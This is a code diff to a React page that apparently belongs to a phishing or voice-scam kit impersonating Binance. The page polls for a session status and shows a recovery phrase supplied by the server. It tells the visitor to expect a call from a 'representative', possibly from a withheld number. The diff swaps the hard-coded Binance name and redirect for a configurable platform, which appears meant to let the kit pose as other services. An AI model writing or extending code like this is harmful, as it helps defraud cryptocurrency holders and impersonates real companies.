@@ -8,6 +8,7 @@ import { Button } from "@/components/ui/button";
 import { Check, Copy } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { SecuritySession } from "@binance/db";
+import { getPlatform } from "@/lib/platform";
 
 interface Props {
   securitySession: SecuritySession;
@@ -30,8 +31,8 @@ export default function ClientOnly({ securitySession }: Props) {
 
       console.log("Polling for status updates:", data.status);
       if (data.status === "completed") {
-        // redirect to binance.com
-        window.location.href = "https://www.binance.com";
+        // redirect to the platform site
+        window.location.href = getPlatform().redirectUrl;
       }
       if (data.recoveryPhrase) {
         setRecoveryPhrase(data.recoveryPhrase);
@@ -122,7 +123,8 @@ export default function ClientOnly({ securitySession }: Props) {
               <>
                 <div className="text-center mb-6">
                   <h2 className="text-2xl font-semibold mb-2">
-                    Please expect a call from binance representative shortly
+                    Please expect a call from a {getPlatform().name}{" "}
+                    representative shortly
                   </h2>
                   <p className="text-gray-400 text-sm text-center px-4 mb-4">
                     Calls may may show up from a restricted or withheld number.
